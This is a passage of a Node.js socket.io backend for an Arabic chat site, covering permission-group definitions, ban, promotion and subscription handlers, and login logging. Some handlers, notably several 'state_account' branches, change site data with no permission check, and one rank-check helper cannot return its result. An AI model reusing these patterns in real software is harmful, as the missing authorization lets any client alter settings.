                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 600,
                        name: "ماستر. اخضر",
                        ico: "1604252206680.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 1,
                        publicmsg: 10,
                        forcepm: 1,
                        roomowner: 0,
                        createroom: 0,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 5000,
                        name: "تاج اسود",
                        ico: "1604252189266.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 1,
                        publicmsg: 1000,
                        forcepm: 1,
                        roomowner: 0,
                        createroom: 1,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 1,
                        owner: 0,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 5000,
                        name: "تاج  وردي",
                        ico: "1604252198211.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 1,
                        publicmsg: 1000,
                        forcepm: 1,
                        roomowner: 0,
                        createroom: 1,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 1,
                        owner: 0,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 6000,
                        name: "اداريه",
                        ico: "1604252466966.gif",
                        kick: 1000,
                        delbc: true,
                        alert: true,
                        mynick: true,
                        unick: true,
                        ban: true,
                        publicmsg: 1000,
                        forcepm: true,
                        loveu: true,
                        roomowner: false,
                        createroom: false,
                        rooms: 1000,
                        edituser: false,
                        meiut: true,
                        ulike: true,
                        flter: false,
                        subs: false,
                        shrt: false,
                        msgs: false,
                        bootedit: false,
                        setpower: false,
                        upgrades: 1000,
                        history: false,
                        cp: false,
                        grupes: false,
                        delpic: true,
                        delmsg: true,
                        stealth: true,
                        owner: false,
                    },
                    {
                        rank: 6000,
                        name: "ادمن اسود",
                        ico: "1604252500146.png",
                        kick: 1000,
                        delbc: true,
                        alert: true,
                        mynick: true,
                        unick: true,
                        ban: true,
                        publicmsg: 1000,
                        forcepm: true,
                        loveu: true,
                        roomowner: false,
                        createroom: true,
                        rooms: 1000,
                        edituser: false,
                        meiut: true,
                        ulike: true,
                        flter: false,
                        subs: false,
                        shrt: false,
                        msgs: false,
                        bootedit: false,
                        setpower: false,
                        upgrades: 1000,
                        history: false,
                        cp: false,
                        grupes: false,
                        delpic: true,
                        delmsg: true,
                        stealth: true,
                        owner: false,
                    },
                    {
                        rank: 8000,
                        name: "خاص غزل",
                        ico: "1606928549683.gif",
                        kick: 1000,
                        delbc: true,
                        alert: true,
                        mynick: true,
                        unick: true,
                        ban: true,
                        publicmsg: 1000,
                        forcepm: true,
                        loveu: true,
                        roomowner: true,
                        createroom: false,
                        rooms: 1000,
                        edituser: true,
                        meiut: true,
                        ulike: true,
                        flter: false,
                        subs: true,
                        shrt: true,
                        msgs: true,
                        bootedit: true,
                        setpower: true,
                        upgrades: 1000,
                        history: true,
                        cp: true,
                        grupes: true,
                        delpic: true,
                        delmsg: true,
                        stealth: true,
                        owner: true,
                    },
                    {
                        rank: 8999,
                        name: "خاص بنين",
                        ico: "",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 1,
                        publicmsg: 1000,
                        forcepm: 1,
                        roomowner: 1,
                        createroom: 1,
                        rooms: 1000,
                        edituser: 1,
                        setpower: 1,
                        upgrades: 1000,
                        history: 1,
                        cp: 1,
                        stealth: 1,
                        owner: 1,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 1,
                        subs: 1,
                        shrt: 1,
                        msgs: 1,
                        bootedit: 1,
                        grupes: 1,
                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 8000,
                        name: "ريكاا",
                        ico: "1607703078429.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 1,
                        publicmsg: 100,
                        forcepm: 1,
                        roomowner: 1,
                        createroom: 1,
                        rooms: 1000,
                        edituser: 1,
                        setpower: 1,
                        upgrades: 1000,
                        history: 1,
                        cp: 1,
                        stealth: 1,
                        owner: 1,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 1,
                        subs: 1,
                        shrt: 1,
                        msgs: 1,
                        bootedit: 1,
                        grupes: 1,
                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 8000,
                        name: "سمو",
                        ico: "1606795923138.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 1,
                        publicmsg: 1000,
                        forcepm: 1,
                        roomowner: 1,
                        createroom: 1,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 1,
                        cp: 1,
                        stealth: 1,
                        owner: 0,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 0,
                        subs: 1,
                        shrt: 1,
                        msgs: 1,
                        bootedit: 1,
                        grupes: 1,
                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 40,
                        name: "بنر ياسر",
                        ico: "1606928200825.gif",
                        kick: 1000,
                        delbc: true,
                        alert: true,
                        mynick: true,
                        unick: false,
                        ban: false,
                        publicmsg: 1,
                        forcepm: false,
                        loveu: false,
                        roomowner: false,
                        createroom: false,
                        rooms: 1000,
                        edituser: false,
                        meiut: false,
                        ulike: false,
                        flter: false,
                        subs: false,
                        shrt: false,
                        msgs: false,
                        bootedit: false,
                        setpower: false,
                        upgrades: 1000,
                        history: false,
                        cp: false,
                        grupes: false,
                        delpic: false,
                        delmsg: false,
                        stealth: false,
                        owner: false,
                    },
                    {
                        rank: 8000,
                        name: "خاص طيبه",
                        ico: "1604252189266.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 1,
                        publicmsg: 1000,
                        forcepm: 1,
                        roomowner: 1,
                        createroom: 1,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 1,
                        cp: 1,
                        stealth: 1,
                        owner: 0,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 0,
                        subs: 1,
                        shrt: 1,
                        msgs: 1,
                        bootedit: 1,
                        grupes: 1,
                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 100,
                        name: "بنر انثى",
                        ico: "1607019375767.gif",
                        kick: 1000,
                        delbc: true,
                        alert: true,
                        mynick: true,
                        unick: true,
                        ban: true,
                        publicmsg: 10,
                        forcepm: true,
                        loveu: true,
                        roomowner: false,
                        createroom: false,
                        rooms: 1000,
                        edituser: false,
                        meiut: true,
                        ulike: true,
                        flter: false,
                        subs: false,
                        shrt: false,
                        msgs: false,
                        bootedit: false,
                        setpower: false,
                        upgrades: 1000,
                        history: false,
                        cp: false,
                        grupes: false,
                        delpic: true,
                        delmsg: true,
                        stealth: false,
                        owner: false,
                    },
                    {
                        rank: 30,
                        name: "فيب",
                        ico: "1607421762667.gif",
                        kick: 0,
                        delbc: 0,
                        alert: 0,
                        mynick: 0,
                        unick: 0,
                        ban: 0,
                        publicmsg: 0,
                        forcepm: 0,
                        roomowner: 0,
                        createroom: 0,
                        rooms: 0,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 0,
                        loveu: 0,
                        ulike: 0,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 0,
                        delpic: 0,
                    },
                    {
                        rank: 6000,
                        name: "nadineEE",
                        ico: "1607543826533.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 0,
                        publicmsg: 10,
                        forcepm: 1,
                        roomowner: 0,
                        createroom: 1,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 0,
                        subs: 1,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 600,
                        name: "غلآگ",
                        ico: "1604252264678.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 0,
                        unick: 0,
                        ban: 0,
                        publicmsg: 10,
                        forcepm: 1,
                        roomowner: 0,
                        createroom: 0,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 0,
                        delpic: 1,
                    },
                    {
                        rank: 500,
                        name: "بنر قاهر",
                        ico: "1607525516422.gif",
                        kick: 1000,
                        delbc: 1,
                        alert: 1,
                        mynick: 1,
                        unick: 1,
                        ban: 0,
                        publicmsg: 1,
                        forcepm: 1,
                        roomowner: 1,
                        createroom: 0,
                        rooms: 1000,
                        edituser: 0,
                        setpower: 0,
                        upgrades: 1000,
                        history: 0,
                        cp: 0,
                        stealth: 0,
                        owner: 0,
                        meiut: 1,
                        loveu: 1,
                        ulike: 1,
                        flter: 0,
                        subs: 0,
                        shrt: 0,
                        msgs: 0,
                        bootedit: 0,
                        grupes: 0,
                        delmsg: 1,
                        delpic: 1,
                    },
                    {
                        rank: 600,
                        name: "طُـٌـٌٌـٌفُـ,ـلُـِـِِـِِِـِِـِـة",
                        ico: "1607738173964.gif",
                        kick: 1000,
                        delbc: true,
                        alert: true,
                        mynick: true,
                        unick: true,
                        ban: true,
                        publicmsg: 10,
                        forcepm: true,
                        loveu: true,
                        roomowner: false,
                        createroom: true,
                        rooms: 1000,
                        edituser: false,
                        meiut: true,
                        ulike: true,
                        flter: false,
                        subs: false,
                        shrt: false,
                        msgs: false,
                        bootedit: false,
                        setpower: false,
                        upgrades: 1000,
                        history: false,
                        cp: false,
                        grupes: false,
                        delpic: true,
                        delmsg: true,
                        stealth: false,
                        owner: false,
                    },
                    {
                        rank: 1000,
                        name: "خاص وائل",
                        ico: "1604252538606.gif",
                        kick: 1000,
                        delbc: true,
                        alert: true,
                        mynick: true,
                        unick: true,
                        ban: true,
                        publicmsg: 1000,
                        forcepm: true,
                        loveu: true,
                        roomowner: true,
                        createroom: true,
                        rooms: 1000,
                        edituser: true,
                        meiut: true,
                        ulike: true,
                        flter: false,
                        subs: true,
                        shrt: true,
                        msgs: true,
                        bootedit: true,
                        setpower: true,
                        upgrades: 1000,
                        history: true,
                        cp: true,
                        grupes: true,
                        delpic: true,
                        delmsg: true,
                        stealth: true,
                        owner: true,
                    },
                ];

                save_power.save(function (err, savepower) {
                    if (err) throw err;
                    if (savepower) {
                    }
                });
            }
        });
    }

    StartNewServer();
    function iswlecome() {
        messages_list.find({ category: "w" }, function (err, wlc) {
            if (err) throw err;
            if (wlc) {
                for (var i = 0; i < wlc.length; i++) {
                    socket.emit("msg", {
                        cmd: "msg",
                        data: {
                            bg: "",
                            class: "pmsgc",
                            force: 0,
                            topic: wlc[i].adresse,
                            msg: wlc[i].msg,
                            ucol: "red",
                            mcol: "#000000",
                            roomid: "efOiAhhNdL",
                            pic: "prv1.png",
                            uid: "",
                        },
                    });
                }
            }
        });
    }

    room_list
        .find({}, function (err, room) {
            if (err) throw err;
            if (room) {
                roomslists = room;
            }
        })
        .select("-_id")
        .select("-v");

    zak_list.find({}, function (err, zak) {
        if (err) throw err;
        if (zak) {
            ektisar = zak;
        }
    });

    noletters_list.find({}, function (err, nos) {
        if (err) throw err;
        if (nos) {
            noletter = nos;
        }
    });

    function savelogin(data) {
        if (data) {
            log_list.findOne({ $and: [{ ip: data.ip, state: data.state }] }, function (err, logis) {
                if (err) throw err;
                if (logis) {
                    var UpdateIp = {
                        $set: {
                            time: data.time,
                            device: data.device,
                        },
                    };
                    log_list.updateOne({ id: data.ip }, UpdateIp, function (err, uruser) {
                        if (err) throw err;
                        if (uruser) {
                        }
                    });
                } else {
                    var save_log = new log_list();
                    save_log.state = data.state;
                    save_log.topic = data.topic;
                    save_log.topic1 = data.topic1;
                    save_log.ip = data.ip;
                    save_log.code = data.code;
                    save_log.device = data.device;
                    save_log.isin = data.isin;
                    save_log.time = data.time;
                    save_log.save(function (err, save_users) {
                        if (err) throw err;
                        if (save_users) {
                        }
                    });
                }
            });
        }
    }

    function save_names(data) {
        if (data) {
            myname_list.findOne({ $and: [{ ip: data.ip, fb: data.fb }] }, function (err, logis) {
                if (err) throw err;
                if (logis) {
                } else {
                    var save_log = new myname_list();
                    save_log.iduser = data.iduser;
                    save_log.fp = data.fp;
                    save_log.ip = data.ip;
                    save_log.topic = data.topic;
                    save_log.username = data.username;
                    save_log.save(function (err, save_users) {
                        if (err) throw err;
                        if (save_users) {
                        }
                    });
                }
            });
        }
    }

    function saves_bar(data) {
        var save_bar = new bar_list();
        save_bar.bg = data.bg;
        save_bar.bid = data.bid;
        save_bar.bcc = data.bcc;
        save_bar.likes = data.likes;
        save_bar.force = data.force;
        save_bar.lid = data.lid;
        save_bar.mcol = data.mcol;
        save_bar.pic = data.pic;
        save_bar.msg = data.msg;
        save_bar.topic = data.topic;
        save_bar.ucol = data.ucol;
        save_bar.uid = data.uid;
        save_bar.save(function (err, save_bars) {
            if (err) throw err;
            if (save_bars) {
                bar_list.find({}, function (err, datavb) {
                    if (err) throw err;
                    if (datavb) {
                        for (var i = 0; i < datavb.length; i++) {
                            if (i >= 20)
                                bar_list.deleteOne({ _id: datavb[1]._id }, function (err, res) {
                                    if (err) throw err;
                                    if (res) {
                                        io.emit("msg", { cmd: "delbc", data: { bid: datavb[1].bid } });
                                    }
                                });
                        }
                    }
                });
            }
        });
    }

    function savestate(data) {
        if (data) {
            var save_log = new states_list();
            save_log.state = data.state;
            save_log.topic = data.topic;
            save_log.topic2 = data.topic1;
            save_log.room = data.room;
            save_log.time = data.time;
            save_log.save(function (err, save_users) {
                if (err) throw err;
                if (save_users) {
                }
            });
        }
    }

    socket.on("banddevice", function (data, token) {
        if (data) {
            var save_band = new band_list();
            if (ValidateIPaddress(data)) {
                save_band.ip_band = data;
                save_band.device_band = "";
                save_band.name_band = "حظر اي بي";
            } else {
                save_band.ip_band = "";
                save_band.device_band = data;
                save_band.name_band = "حظر جهاز";
            }
            save_band.date_band = new Date();
            save_band.date_end = DateMonth;
            save_band.type = "system1";
            save_band.save(function (err, save_van) {
                if (err) throw err;
                if (save_van) {
                    user_list.findOne({ token: token }, function (err, isaves) {
                        if (err) throw err;
                        if (isaves) {
                            savestate({ state: "حظر", topic: isaves.topic, topic1: data, room: "", time: new Date().getTime() });
                        }
                    });
                    socket.emit("done_band", {
                        id: save_van._id,
                        user: "حظر مخفي",
                        decoderDans: false,
                        type: data,
                        data: "دائم",
                    });
                }
            });
        }
    });

    socket.on("delete_power", function (data) {
		if(data){
  user_list.findOne({ token: data.token }, function (err, isaves) {
 if (err) throw err;
 if (isaves) {
 const ispow = ispowers.findIndex((x) => x.name == isaves.power);
 const ispowa = ispowers.findIndex((x) => x.name == data.state);
if(ispowers[ispow].rank > ispowers[ispowa].rank){
								
								 
 let isqu = { $pull: { "powers": {name:data.state} } };
                    power_list.updateOne({ _id: "5fb8ff22a7bab610707bbf86"}, isqu, function (err, res) {
                        if (err) throw err;
                        if (res) {
                                 socket.emit("deletedone_iow", data.state);
                                 socket.emit("savedone", "تم مسح المجموعة");
						}
					});
							}else{
                                 socket.emit("savedone", "لايس لديك الصلاحية لمسح هذه المجموعة");
							};
		};
		});
		}
	});
		
		
    socket.on("save_power", function (data, token) {
        if (data) {
            user_list.findOne({ token: token }, function (err, isd) {
                if (err) throw err;
		        const ispowa = ispowers.findIndex((x) => x.name == isd.power);
                if(ispowers[ispowa].rank < data.rank){
					
                    socket.emit("savedone", "لا يمكنك رفع ترتيب المجموعه اعلى من ترتيب مجموعتك");
                } else {
					power_list.findOne({_id: "5fb8ff22a7bab610707bbf86", "powers.name": data.name},function (err, ispo) {
                     if (err) throw err;
                 if (ispo) {
                    let isqu = { $set: { "powers.$": data } };
                    power_list.updateOne({ _id: "5fb8ff22a7bab610707bbf86", "powers.name": data.name }, isqu, function (err, res) {
                        if (err) throw err;
                        if (res) {
                            socket.emit("savedone", "تم التعديل على الصلاحية");

                            user_list.findOne({ token: token }, function (err, isaves) {
                                if (err) throw err;
                                if (isaves) {
                                    savestate({ state: "تعديل مجموعة", topic: isaves.topic, topic1: isaves.topic1, room: data.name, time: new Date().getTime() });
                                }
                            });
                        }
                    });
				 }else{
					       user_list.findOne({ token: token }, function (err, isaves) {
                                if (err) throw err;
                                if (isaves) {
                            const ispow = ispowers.findIndex((x) => x.name == isaves.power);
							if(ispowers[ispow].rank > data.rank){
                    let isqua = { $push: { "powers": data } };
                     power_list.updateOne({ _id: "5fb8ff22a7bab610707bbf86" }, isqua, function (err, res) {
                        if (err) throw err;
                        if (res) {
                            socket.emit("savedone", "تم إظافة مجموعة جديدة");
                  
                                    savestate({ state: "إظافة مجموعة جديدة", topic: isaves.topic, topic1: isaves.topic1, room: data.name, time: new Date().getTime() });
                                }
                            });
							}else{
                                 socket.emit("savedone", "لا يمكنك إظافة مجموعة اعلى من ترتيبك");
							};
                        }
                    });
				 }
					});
                }
            });
        }
    });

   function bandsystem(data){
	   if(data){
    savelogin({
                state: data.gust,
                topic: data.user,
                topic1: data.user,
                ip: 'نظام محظور',
                code: data.code,
                device:'نظام محظور ',
                isin: data.refr,
                time: new Date().getTime(),
                });
										
	       socket.emit("msg", { cmd: "removede", data: {} });
                socket.emit("msg", {
                    cmd: "not",
                    data: {
                        topic: "",
                        msg: data.type+" نظامك محظور في هذا التطبيق",
                        user: "",
                        force: 0,
                        nonot: true,
                    },
                });
	   };
   };

    function bandbrowser(data){
   if(data){
    savelogin({
                state: data.gust,
                topic: data.user,
                topic1: data.user,
                ip: ' متصفح محظور',
                code: data.code,
                device:' متصفح محظور',
                isin: data.refr,
                time: new Date().getTime(),
                });
	       socket.emit("msg", { cmd: "removede", data: {} });
                socket.emit("msg", {
                    cmd: "not",
                    data: {
                        topic: "",
                        msg: data.type+" هذا المتصفح محظور في هذا التطبيق",
                        user: "",
                        force: 0,
                        nonot: true,
                    },
                });
   };
   };
   
    function ChangeSatets(data) {
        if (UserInfo[socket.id]) {
            const indexa = online.findIndex((x) => x.id == socket.id);
            if (indexa != -1 && UserInfo[socket.id].busy == false && online[indexa].stat != 4) {
                online[indexa].stat = data;
                io.emit("msg", { cmd: "u^", data: online[indexa] });
            }
        }
    }
    socket.on("isstates", ChangeSatets);

    socket.on("istoken", function (data) {
        user_list.findOne({ token: data }, function (err, data) {
            if (err) throw err;
            if (data) {
            } else {
                socket.emit("errortoken");
            }
        });
    });

    function getLetters(items) {
        var letters = [];

        items.forEach(function (item) {
            if (letters.indexOf(item.name[0].toUpperCase()) === -1) {
                letters.push(item.name[0].toUpperCase());
            }
        });

        return letters;
    }

    socket.on("getpower", function (data) {
        var isrank = [];
        if (data) {
            user_list.findOne({ token: data }, function (err, user) {
                if (err) throw err;
                if (user) {
                    power_list.findOne({ _id: "5fb8ff22a7bab610707bbf86" }, function (err, isda) {
                        if (err) throw err;
                        if (isda) {
                            const indexroom = isda["powers"].findIndex((x) => x.name == user.power);
                            if (indexroom != -1) {
                                power_list.findOne({ _id: "5fb8ff22a7bab610707bbf86" }, function (err, data) {
                                    if (err) throw err;
                                    if (data) {
                                        for (var i = 0; i < data["powers"].length; i++) {
                                            if (isda["powers"][indexroom].rank >= data["powers"][i].rank) {
                                                isrank.push(data["powers"][i]);
                                            }
                                        }
                                        setTimeout(function () {
                                            socket.emit("setpower", isrank, sicos);
                                        }, 100);
                                    }
                                });
                            }
                        }
                    });
                }
            });
        }
    });

    socket.on("getnames", function (data) {
        if (data && UserInfo[data]) {
            myname_list
                .find({ ip: UserInfo[data].ip }, function (err, issub) {
                    if (err) throw err;
                    if (issub) {
                        socket.emit("setnames", issub);
                    }
                })
                .select("-v")
                .select("-_id");
        }
    });

    socket.on("setprivpower", function (data) {
        if (data) {
            user_list.findOne({ token: data.token }, function (err, istoken) {
                if (err) throw err;
                if (istoken) {
                    user_list.findOne({ id: UserInfo[data.mid].uid }, function (err, isid) {
                        if (err) throw err;
                        if (isid) {
                            const ismyid = ispowers.findIndex((x) => x.name == isid.power);
                            const ismytoken = ispowers.findIndex((x) => x.name == istoken.power);
                            if (ispowers[ismytoken].rank > ispowers[ismyid].rank) {
                                var UpdateUse = {
                                    $set: {
                                        power: data.power,
                                    },
                                };

                                if (UserInfo[data.mid]) {
                                    if (!UserInfo[data.mid].uid) {
                                        power_list.findOne({ _id: "5fb8ff22a7bab610707bbf86" }, function (err, pow) {
                                            if (err) throw err;
                                            if (pow) {
                                                socket.emit("savedones", "تم ترقية الزائر");

                                                for (var i = 0; i < pow["powers"].length; i++) {
                                                    if (pow["powers"][i].name == data.power) {
                                                        socket.to(data.mid).emit("msg", { cmd: "power", data: pow["powers"][i] });
                                                    }
                                                }
                                            }
                                        });
                                    }
                                }

                                user_list.updateOne({ id: UserInfo[data.mid].uid }, UpdateUse, function (err, uruser) {
                                    if (err) throw err;
                                    if (uruser) {
                                        subscriptions_list.findOne({ iduser: data.id }, function (err, issub) {
                                            if (err) throw err;
                                            if (issub) {
                                                if (data.day == 0) {
                                                    var isurt = "دائم";
                                                } else {
                                                    var isurt = data.day;
                                                }
                                                var isub = {
                                                    $set: {
                                                        sub: data.power,
                                                        time: data.day,
                                                        timeis: isurt,
                                                    },
                                                };
                                                subscriptions_list.updateOne({ iduser: UserInfo[data.mid].uid }, isub, function (err, isus) {
                                                    if (err) throw err;
                                                    if (isus) {
                                                        socket.emit("savedones", "تم تعديل الاشتراك");
                                                        if (UserInfo[data.mid]) {
                                                            power_list.findOne({ _id: "5fb8ff22a7bab610707bbf86" }, function (err, pow) {
                                                                if (err) throw err;
                                                                if (pow) {
                                                                    for (var i = 0; i < pow["powers"].length; i++) {
                                                                        if (pow["powers"][i].name == data.power) {
                                                                            socket.to(data.mid).emit("msg", { cmd: "power", data: pow["powers"][i] });
                                                                        }
                                                                    }
                                                                }
                                                            });
                                                        }
                                                        user_list.findOne({ token: data.token }, function (err, isaves) {
                                                            if (err) throw err;
                                                            if (isaves) {
                                                                savestate({ state: "تعديل إشتراك", topic: isaves.topic, topic1: isaves.topic1, room: "", time: new Date().getTime() });
                                                            }
                                                        });
                                                    }
                                                });
                                            } else {
                                                user_list.findOne({ id: UserInfo[data.mid].uid }, function (err, isuser) {
                                                    if (err) throw err;
                                                    if (isuser) {
                                                        var save_sub = new subscriptions_list();
                                                        save_sub.iduser = data.id;
                                                        save_sub.sub = data.power;
                                                        save_sub.topic = isuser.topic;
                                                        save_sub.topic1 = isuser.topic1;
                                                        save_sub.time = data.day;
                                                        if (data.day == 0) {
                                                            save_sub.timeis = "دائم";
                                                        } else {
                                                            save_sub.timeis = data.day;
                                                        }
                                                        save_sub.save(function (err, save_not) {
                                                            if (err) throw err;
                                                            if (save_not) {
                                                                socket.emit("savedones", "تم إضافة اشتارك");
                                                                user_list.findOne({ token: data.token }, function (err, isaves) {
                                                                    if (err) throw err;
                                                                    if (isaves) {
                                                                        if (UserInfo[data.mid]) {
                                                                            power_list.findOne({ _id: "5fb8ff22a7bab610707bbf86" }, function (err, pow) {
                                                                                if (err) throw err;
                                                                                if (pow) {
                                                                                    for (var i = 0; i < pow["powers"].length; i++) {
                                                                                        if (pow["powers"][i].name == data.power) {
                                                                                            socket.to(data.mid).emit("msg", { cmd: "power", data: pow["powers"][i] });
                                                                                        }
                                                                                    }
                                                                                }
                                                                            });
                                                                        }
                                                                        savestate({ state: "إضافة إشتراك", topic: isaves.topic, topic1: isaves.topic1, room: "", time: new Date().getTime() });
                                                                    }
                                                                });
                                                            }
                                                        });
                                                    }
                                                });
                                            }
                                        });
                                    }
                                });
                            } else {
                                socket.emit("savedones", "لا يمكنك التعديل على رتبة اعلى منك");
                            }
                        }
                    });
                }
            });
        }
    });

    function verficationpower(token, ids) {
        if (token && ids) {
            user_list.findOne({ token: token }, function (err, istoken) {
                if (err) throw err;
                if (istoken) {
                    user_list.findOne({ id: ids }, function (err, isid) {
                        if (err) throw err;
                        if (isid) {
                            const ismyid = ispowers.findIndex((x) => x.name == isid.power);
                            const ismytoken = ispowers.findIndex((x) => x.name == istoken.power);
                            if (ispowers[ismytoken].rank > ispowers[ismyid].rank) {
                                return 1;
                            } else {
                                return 0;
                            }
                        }
                    });
                }
            });
        }
    }

    socket.on("state_account", function (data) {
        if (data.state == 1) {
            user_list.findOne({ token: data.token }, function (err, istoken) {
                if (err) throw err;
                if (istoken) {
                    user_list.findOne({ id: data.id }, function (err, isid) {
                        if (err) throw err;
                        if (isid) {
                            const ismyid = ispowers.findIndex((x) => x.name == isid.power);
                            const ismytoken = ispowers.findIndex((x) => x.name == istoken.power);
                            if (ispowers[ismytoken].rank > ispowers[ismyid].rank) {
                                user_list.deleteOne({ id: data.id }, function (err, res) {
                                    if (err) throw err;
                                    if (res) {
                                        socket.emit("savedone", "تم مسح الحساب");
                                        user_list.findOne({ token: data.token }, function (err, isaves) {
                                            if (err) throw err;
                                            if (isaves) {
                                                savestate({ state: "حذف عضويه", topic: isaves.topic, topic1: isaves.topic1, room: "", time: new Date().getTime() });
                                            }
                                        });
                                    }
                                });
                            } else {
                                socket.emit("savedone", "لا يمكنك التعديل على رتبة اعلى منك");
                            }
                        }
                    });
                }
            });
        } else if (data.state == 20) {
            var isuppic = {
                $set: {
                    pic: data.pic,
                },
            };
            room_list.updateOne({ id: data.id }, isuppic, function (err, romud) {
                if (err) throw err;
                if (romud) {
                    socket.emit("savedone", "تم تغيير صورة الروم");
                }
            });
        } else if (data.state == 15) {
            noletters_list.deleteOne({ _id: data.id }, function (err, res) {
                if (err) throw err;
                if (res) {
                    user_list.findOne({ token: data.token }, function (err, isaves) {
                        if (err) throw err;
                        if (isaves) {
                            savestate({ state: "إزالة فلتر	", topic: isaves.topic, topic1: isaves.topic1, room: "", time: new Date().getTime() });
                        }
                    });
                }
            });
        } else if (data.state == 14) {
            user_list.findOne({ token: data.token }, function (err, istoken) {
                if (err) throw err;
                if (istoken) {
                    if (istoken.power == "chatmaster" || istoken.power == "DookMobile") {
                        var isqu = {
                            $set: {
                                site: {
                                    bg: JSON.parse(data.id).bg,
                                    buttons: JSON.parse(data.id).buttons,
                                    background: JSON.parse(data.id).background,
                                    walllikes: JSON.parse(data.id).walllikes,
                                    wallminutes: JSON.parse(data.id).wallminutes,
                                    msgst: JSON.parse(data.id).msgst,
                                    pmlikes: JSON.parse(data.id).pmlikes,
                                    notlikes: JSON.parse(data.id).notlikes,
                                    fileslikes: JSON.parse(data.id).fileslikes,
                                    allowg: JSON.parse(data.id).allowg,
                                    allowreg: JSON.parse(data.id).allowreg,
                                    sitedescription: JSON.parse(data.id).sitedescription,
                                    siteScript: JSON.parse(data.id).siteScript,
                                    sitekeywords: JSON.parse(data.id).sitekeywords,
                                    name: JSON.parse(data.id).name,
                                    title: JSON.parse(data.id).title,
                                },
                            },
                        };
                        setting_list.updateOne({ _id: "5fc3b0fbed6d071214a4f009" }, isqu, function (err, res) {
                            if (err) throw err;
                            if (res) {
                                socket.emit("savedone", "تم حفظ التعديلات بنجاح");
                                user_list.findOne({ token: data.token }, function (err, isaves) {
                                    if (err) throw err;
                                    if (isaves) {
                                        savestate({ state: "تعديل مجموعة	", topic: isaves.topic, topic1: isaves.topic1, room: "", time: new Date().getTime() });
                                    }
                                });
                            }
                        });
                    } else {
                        socket.emit("savedone", "ليس لديك الصلاحية لتعديل على الموقع");
                    }
                }
            });
        } else if (data.state == 13) {
            if (data.id.split("/")[1] == "sico") {
                var querya = { $pull: { sico: data.id.split("/")[2] } };
            } else if (data.id.split("/")[1] == "dro3") {
                var querya = { $pull: { dro3: data.id.split("/")[2] } };
            } else if (data.id.split("/")[1] == "emo") {
                var querya = { $pull: { emo: data.id.split("/")[2] } };
            }

            setting_list.updateOne({ _id: "5fc3b0fbed6d071214a4f009" }, querya, function (err, res) {
                if (err) throw err;
                if (res) {
                    user_list.findOne({ token: data.token }, function (err, isaves) {
                        if (err) throw err;
                        if (isaves) {
                            savestate({ state: "تعديل إدارة الموقع	", topic: isaves.topic, topic1: isaves.topic1, room: "", time: new Date().getTime() });
                        }
                    });
                }
            });
        } else if (data.state == 2) {
            if (data.like) {
                var UpdateUser = {
                    $set: {
                        rep: data.like,
                    },
                };

                user_list.findOne({ token: data.token }, function (err, istoken) {
                    if (err) throw err;
                    if (istoken) {
